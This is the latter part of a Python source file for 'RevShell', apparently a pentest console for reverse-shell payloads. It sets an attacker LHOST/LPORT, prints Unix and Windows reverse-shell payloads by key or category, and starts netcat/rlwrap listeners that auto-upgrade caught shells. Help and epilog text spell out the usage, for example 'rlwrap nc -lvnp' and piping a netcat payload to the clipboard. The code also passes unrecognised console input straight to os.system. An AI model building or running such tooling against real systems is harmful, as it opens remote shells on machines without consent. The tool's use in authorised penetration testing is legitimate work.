        if p.category != last_cat:
            last_cat = p.category
            label = CATEGORY_LABELS.get(p.category, p.category)
            print(f"\n  {C.bold(C.CYAN + '  ' + label + C.END)}")
        icon = PLATFORM_ICON.get(p.platform, "")
        print(f"  {C.g(p.key):<{26+len(C.GREEN)+len(C.END)}}"
              f"{p.name:<22}{icon + ' ' + p.platform:<14}")
    print(f"\n  {C.grey('-' * W)}\n")


# ─── Banner / Help ────────────────────────────────────────────────────────────

BANNER = f"""
{C.WHITE}
╔══════════════════════════════════════════════════════════════╗
║                          RevShell                            ║
╚══════════════════════════════════════════════════════════════╝{C.END}
{C.DIM}  reverse shell payload manager console{C.END}
{C.DIM}  Author: {C.BOLD}{C.RED}@ZetaOrioniss{C.END}   {C.DIM}Version: {C.BOLD}{C.RED}v2.1{C.END}
{C.DIM}  Type {C.END}{C.BOLD}help{C.END}{C.DIM} to list available commands.{C.END}
"""

HELP = f"""
  {C.bold('CONFIGURATION')}
  {C.g('load config')}                  Load LHOST/LPORT from conf.json
  {C.g('set ip <addr|iface>')}          Set LHOST — IP or interface name (e.g. tun0)
  {C.g('set port <port>')}              Set LPORT
  {C.g('unset ip|port')}                Clear a value
  {C.g('show options')}                 Current LHOST / LPORT

  {C.bold('NETWORK')}
  {C.g('ifconfig')}                     List IPv4 interfaces
  {C.g('ifconfig pick')}                Interactive picker → sets LHOST

  {C.bold('PAYLOADS')}
  {C.g('show')}                         List all payloads with keys
  {C.g('show <category>')}              Filter by category  (bash / python / php ...)
  {C.g('use <key>')}                    Print a single payload
  {C.g('run')}                          Print all payloads
  {C.g('run <key>')}                    Print one payload by key
  {C.g('run --unix')}                   Unix payloads only
  {C.g('run --windows')}                Windows payloads only
  {C.g('run --cat <name>')}             Filter by category

  {C.bold('LISTENER')}
  {C.g('listener')}                     Smart listener: auto-upgrades shell on connect
  {C.g('listener --no-upgrade')}        Smart listener without auto-upgrade
  {C.g('rlwrap')}                       Classic rlwrap nc -lvnp (no auto-upgrade)

  {C.bold('SHELL')}
  {C.g('! <command>')}                  Run a native system command
  {C.g('shell')}                        Drop into /bin/bash

  {C.bold('OTHER')}
  {C.g('clear')}                        Clear screen
  {C.g('help')}                         Show this help
  {C.g('exit')} / {C.g('quit')}                 Exit
"""


# ─── Tab completion ───────────────────────────────────────────────────────────

COMMANDS  = ["load", "set", "unset", "use", "run", "generate", "show",
             "ifconfig", "interfaces", "listener", "rlwrap", "shell",
             "clear", "help", "exit", "quit", "!"]
SET_KEYS  = ["ip", "port", "lhost", "lport", "host"]
SHOW_OPTS = ["payloads", "options"] + CATEGORIES
SHELL_KEYS = [p.key for p in PAYLOADS]


def _iface_names() -> list[str]:
    try:
        return list(get_interfaces().keys())
    except Exception:
        return []


def completer(text: str, state: int):
    line  = readline.get_line_buffer().lstrip()
    parts = line.split()
    n     = len(parts)

    if n == 0 or (n == 1 and not line.endswith(" ")):
        opts = [c for c in COMMANDS if c.startswith(text)]
    elif parts[0] == "set" and n <= 2:
        opts = [k for k in SET_KEYS if k.startswith(text)]
    elif parts[0] == "set" and n == 3 and parts[1].lower() in ("ip","host","lhost"):
        opts = [x for x in _iface_names() if x.startswith(text)]
    elif parts[0] in ("use","run") and n <= 2:
        opts = [k for k in SHELL_KEYS if k.startswith(text)]
    elif parts[0] == "show" and n <= 2:
        opts = [o for o in SHOW_OPTS if o.startswith(text)]
    elif parts[0] == "unset" and n <= 2:
        opts = [k for k in ("ip","port") if k.startswith(text)]
    elif parts[0] == "listener" and n <= 2:
        opts = [o for o in ("--no-upgrade",) if o.startswith(text)]
    elif parts[0] in ("ifconfig","interfaces") and n <= 2:
        opts = [o for o in ("pick",)+tuple(_iface_names()) if o.startswith(text)]
    else:
        opts = []

    return opts[state] if state < len(opts) else None


readline.set_completer(completer)
readline.parse_and_bind("tab: complete")


# ─── Prompt ───────────────────────────────────────────────────────────────────

def prompt(session: Session) -> str:
    h = session.lhost or C.grey("-")
    p = session.lport or C.grey("-")
    return (f"{C.BOLD}{C.RED}revshell{C.END}"
            f" {C.grey(f'({h}:{p})')}"
            f" {C.BOLD}{C.GREEN}>{C.END} ")


# ─── CLI args ─────────────────────────────────────────────────────────────────

def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="revshell",
        description="Reverse Shell Generator — interactive console or one-shot CLI",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "examples:\n"
            "  revshell.py                                 # interactive console\n"
            "  revshell.py -H 10.10.14.5 -P 4444          # pre-set LHOST/LPORT\n"
            "  revshell.py -H tun0 -P 4444 -u bash_tcp    # resolve iface + one payload\n"
            "  revshell.py -H 10.10.14.5 -P 4444 --all    # all payloads, then exit\n"
            "  revshell.py --list --cat netcat             # list netcat payloads\n"
            "  revshell.py -H 10.0.0.1 -P 4444 -u nc_e --raw | xclip\n"
        )
    )
    conn = parser.add_argument_group("connection")
    conn.add_argument("-H","--host", metavar="LHOST",
        help="Attacker IP or interface name (e.g. tun0)")
    conn.add_argument("-P","--port", metavar="LPORT", help="Listener port")
    out = parser.add_argument_group("one-shot output")
    out.add_argument("-u","--use", metavar="KEY",
        help="Print a single payload by key and exit")
    out.add_argument("--all", action="store_true",
        help="Print all payloads and exit")
    out.add_argument("--list", action="store_true",
        help="List payload keys/names and exit")
    out.add_argument("--raw", action="store_true",
        help="With -u: bare command only, no colours")
    flt = parser.add_argument_group("filters")
    flt.add_argument("--unix",    action="store_true", help="Unix payloads only")
    flt.add_argument("--windows", action="store_true", help="Windows payloads only")
    flt.add_argument("--cat", metavar="CAT", choices=CATEGORIES,
        help="Filter by category")
    lst = parser.add_argument_group("listener")
    lst.add_argument("--listen",     action="store_true",
        help="Start smart listener (auto-upgrade) and exit")
    lst.add_argument("--rlwrap",     action="store_true",
        help="Start rlwrap nc -lvnp and exit")
    lst.add_argument("--no-upgrade", dest="no_upgrade", action="store_true",
        help="Disable auto-upgrade with --listen")
    misc = parser.add_argument_group("misc")
    misc.add_argument("--ifconfig",  action="store_true",
        help="List interfaces and exit")
    misc.add_argument("--no-banner", dest="no_banner", action="store_true",
        help="Suppress banner")
    return parser


def run_cli(args: argparse.Namespace) -> int:
    session = Session()
    if args.host:
        if is_interface_name(args.host):
            ip = resolve_iface_ip(args.host)
            if ip is None:
                print(C.r(f"  Interface '{args.host}' not found."), file=sys.stderr)
                return 1
            session.lhost = ip
        else:
            session.lhost = args.host
    if args.port:
        session.lport = args.port

    if args.ifconfig:
        print_interfaces()
        return 0
    if args.list:
        print_payload_list(cat_filter=args.cat)
        return 0
    if args.use:
        key = args.use.lower()
        if key not in PAYLOAD_MAP:
            print(C.r(f"  Unknown key: '{args.use}'"), file=sys.stderr)
            return 1
        p = PAYLOAD_MAP[key]
        if args.raw:
            print(p.render(session.lhost or "<LHOST>", session.lport or "<LPORT>"))
        else:
            print_single_payload(p, session)
        return 0
    if args.all:
        pf = "unix" if args.unix else ("windows" if args.windows else None)
        print_all_payloads(session, platform_filter=pf, cat_filter=args.cat)
        return 0
    if args.listen:
        if not session.lport:
            print(C.r("  LPORT not set — pass -P <port>"), file=sys.stderr)
            return 1
        smart_listener(session.lport, lhost=session.lhost or "0.0.0.0",
                       auto_upgrade_flag=not args.no_upgrade)
        return 0
    if args.rlwrap:
        if not session.lport:
            print(C.r("  LPORT not set — pass -P <port>"), file=sys.stderr)
            return 1
        nc_listener(session.lport, use_rlwrap=True)
        return 0
    return -1


# ─── Main interactive loop ────────────────────────────────────────────────────

def run_console(session: Optional[Session] = None, no_banner: bool = False) -> None:
    if not no_banner:
        print(BANNER)
    if session is None:
        session = Session()

    while True:
        try:
            raw = input(prompt(session)).strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n  {C.grey('Goodbye.')}\n")
            break

        if not raw:
            continue

        if raw.startswith("!"):
            cmd_str = raw[1:].strip()
            run_shell_command(cmd_str) if cmd_str else print(C.r("  Usage: ! <command>"))
            continue

        try:
            parts = shlex.split(raw)
        except ValueError as e:
            print(C.r(f"  Parse error: {e}"))
            continue

        cmd  = parts[0].lower()
        args = parts[1:]

        if cmd in ("exit","quit"):
            print(f"\n  {C.grey('Goodbye.')}\n")
            break

        elif cmd == "help":
            print(HELP)

        elif cmd == "clear":
            print("\033[2J\033[H", end="")
            print(BANNER)

        elif cmd == "shell":
            print(f"\n  {C.grey('Dropping into /bin/bash  (exit to return)')}\n")
            try:
                subprocess.run(["/bin/bash"])
            except Exception as e:
                print(C.r(f"  {e}"))

        elif cmd == "load":
            if len(args) != 1 or args[0].lower() != "config":
                print(C.r("  Usage: load config"))
            else:
                param = load_config().get("param", {})
                host  = param.get("host","")
                port  = param.get("port","")
                if host:
                    session.lhost = host
                    print(f"  LHOST  {C.grey('=>')}  {C.g(host)}")
                else:
                    print(C.grey("  LHOST not set in config."))
                if port:
                    session.lport = port
                    print(f"  LPORT  {C.grey('=>')}  {C.g(port)}")
                else:
                    print(C.grey("  LPORT not set in config."))

        elif cmd == "set":
            if len(args) < 2:
                print(C.r("  Usage: set <ip|port> <value|iface>"))
            else:
                ok, resolved = session.set(args[0], args[1])
                if ok:
                    label   = "LHOST" if args[0].lower() in ("ip","host","lhost") else "LPORT"
                    display = resolved if resolved else args[1]
                    extra   = f"  {C.grey('(from ' + args[1] + ')')}" if resolved else ""
                    print(f"  {label}  {C.grey('=>')}  {C.g(display)}{extra}")
                    change_config(host=display) if label=="LHOST" else change_config(port=display)
                else:
                    if args[0].lower() in ("ip","host","lhost") and is_interface_name(args[1]):
                        print(C.r(f"  Interface '{args[1]}' not found."))
                        print(C.grey("  Run ifconfig to list available interfaces."))
                    else:
                        print(C.r(f"  Unknown key: '{args[0]}'  (ip, port)"))

        elif cmd == "unset":
            if not args:
                print(C.r("  Usage: unset <ip|port>"))
            else:
                k = args[0].lower()
                if k in ("ip","host","lhost"):
                    session.lhost = None
                    change_config(host="")
                    print(C.grey("  LHOST cleared."))
                elif k in ("port","lport"):
                    session.lport = None
                    change_config(port="")
                    print(C.grey("  LPORT cleared."))
                else:
                    print(C.r(f"  Unknown key: '{args[0]}'"))

        elif cmd == "show":
            sub = args[0].lower() if args else ""
            if sub == "options":
                h = C.g(session.lhost) if session.lhost else C.r("not set")
                p = C.g(session.lport) if session.lport else C.r("not set")
                print(f"\n  LHOST  {C.grey('=>')}  {h}")
                print(f"  LPORT  {C.grey('=>')}  {p}\n")
            elif sub in CATEGORIES:
                print_payload_list(cat_filter=sub)
            elif sub in ("payloads","shells",""):
                print_payload_list()
            else:
                print(C.r(f"  Unknown option: '{sub}'"))

        elif cmd in ("ifconfig","interfaces"):
            sub    = args[0].lower() if args else ""
            ifaces = get_interfaces()
            if sub == "pick":
                interactive_iface_picker(session)
            elif sub and sub in ifaces:
                print_interfaces(highlight=sub)
            else:
                print_interfaces()
                print(C.grey("  Tip: ifconfig pick  to set LHOST interactively\n"))

        elif cmd == "use":
            if not args:
                print(C.r("  Usage: use <key>  — run show to list keys"))
            else:
                key = args[0].lower()
                if key in PAYLOAD_MAP:
                    print_single_payload(PAYLOAD_MAP[key], session)
                else:
                    print(C.r(f"  Unknown payload: '{args[0]}'"))

        elif cmd in ("run","generate"):
            pf:  Optional[str] = None
            cf:  Optional[str] = None
            rem: list[str]     = []
            i = 0
            while i < len(args):
                a = args[i]
                if a in ("--unix","-u"):       pf = "unix"
                elif a in ("--windows","-w"):  pf = "windows"
                elif a in ("--cat","-c") and i+1 < len(args):
                    cf = args[i+1].lower(); i += 1
                else:
                    rem.append(a)
                i += 1
            if rem:
                key = rem[0].lower()
                if key in PAYLOAD_MAP:
                    print_single_payload(PAYLOAD_MAP[key], session)
                else:
                    print(C.r(f"  Unknown payload: '{rem[0]}'"))
            else:
                print_all_payloads(session, pf, cf)

        elif cmd == "listener":
            if not session.lport:
                print(C.r("  LPORT not set — type: set port <port>"))
            else:
                no_upgrade = "--no-upgrade" in args
                smart_listener(
                    session.lport,
                    lhost=session.lhost or "0.0.0.0",
                    auto_upgrade_flag=not no_upgrade,
                )

        elif cmd == "rlwrap":
            if not session.lport:
                print(C.r("  LPORT not set — type: set port <port>"))
            else:
                nc_listener(session.lport, use_rlwrap=True)

        else:
            os.system(cmd)


# ─── Entry point ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser   = build_arg_parser()
    cli_args = parser.parse_args()

    non_interactive = any([
        cli_args.all, cli_args.use, cli_args.list,
        cli_args.listen, cli_args.rlwrap, cli_args.ifconfig,
    ])

    if non_interactive:
        rc = run_cli(cli_args)
        sys.exit(0 if rc >= 0 else 1)
    else:
        session = Session()
        if cli_args.host:
            if is_interface_name(cli_args.host):
                ip = resolve_iface_ip(cli_args.host)
                if ip:
                    session.lhost = ip
                    print(f"  LHOST  {C.grey('=>')}  {C.g(ip)}  "
                          f"{C.grey('(from ' + cli_args.host + ')')}")
                else:
                    print(C.r(f"  Interface '{cli_args.host}' not found."), file=sys.stderr)
                    sys.exit(1)
            else:
                session.lhost = cli_args.host
        if cli_args.port:
            session.lport = cli_args.port
        run_console(session=session, no_banner=cli_args.no_banner)
